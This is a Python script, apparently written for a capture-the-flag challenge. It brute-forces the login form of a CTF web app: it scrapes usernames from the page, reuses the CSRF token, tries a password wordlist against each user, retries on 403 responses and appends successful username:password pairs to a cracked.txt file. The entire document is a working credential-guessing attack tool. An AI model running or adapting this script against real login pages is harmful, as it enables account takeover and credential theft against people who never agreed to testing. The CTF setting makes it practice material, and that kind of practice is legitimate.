from bs4 import BeautifulSoup
from time import sleep
import requests, re

URL = 'https://placetospeak.ctf.yummytacos.me/'

HEADERS = {
    'Referer': 'https://placetospeak.ctf.yummytacos.me/',
    'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.386'
}

PASS_DICT = dict()

TOO_HARD = list(map(str.strip, open('too-hard.txt')))
TOO_EASY = list(map(str.strip, open('too-easy.txt')))
ALL = list(map(str.strip, open('logins.txt')))

passwords = list(map(str.strip, open('passwords.txt')))

def get_users(session):
    response = session.get(URL, headers = HEADERS).text

    if ' part ' in response and 'flag' in response:
        print(response)

    soup = BeautifulSoup(response, 'html.parser')

    logins = list(map(lambda x: x.text.strip().split()[0], soup.select('.blockquote-footer')))
    session.get(URL + 'logout')
    print('    [~] Logout...')
    return list(set(logins))

def parse_site(logins, passwords):
    global ALL, TOO_EASY, TOO_HARD

    session = requests.Session()
    response = session.get(URL).text

    soup = BeautifulSoup(response, 'html.parser')
    csrf = soup.select('#login-form > input[type=hidden]')[0].get('value')

    for login in logins:
        if login in TOO_HARD:
            print('    %s can not be cracked' % login)
            continue

        if login in TOO_EASY:
            print('    %s is already cracked' % login)
            continue

        if login not in ALL:
            ALL.append(login)
            open('logins.txt', 'w').writelines(ALL)

        print('Trying %s...' % login)

        for password in passwords:
            if login in PASS_DICT:
                continue

            while True:
                r = session.post(URL + 'login', headers = HEADERS, data = {
                    'csrfmiddlewaretoken': csrf,
                    'username': login,
                    'password': password
                }).text

                if 'Forbidden' in r:
                    print('403 Forbidden -> %s' % login)
                    continue
                else:
                    if 'wrong' not in r:
                        print('[+] login: %s, password: %s' % (login, password))
                        open('cracked.txt', 'a').write('%s:%s\n' % (login, password))

                        PASS_DICT[login] = password
                        TOO_EASY.append(login)
                        open('too-easy.txt', 'w').writelines(TOO_EASY)

                        parse_site(get_users(session), passwords)
                    break

        TOO_HARD.append(login)
        open('too-hard.txt', 'w').writelines(TOO_HARD)

parse_site(ALL, passwords)
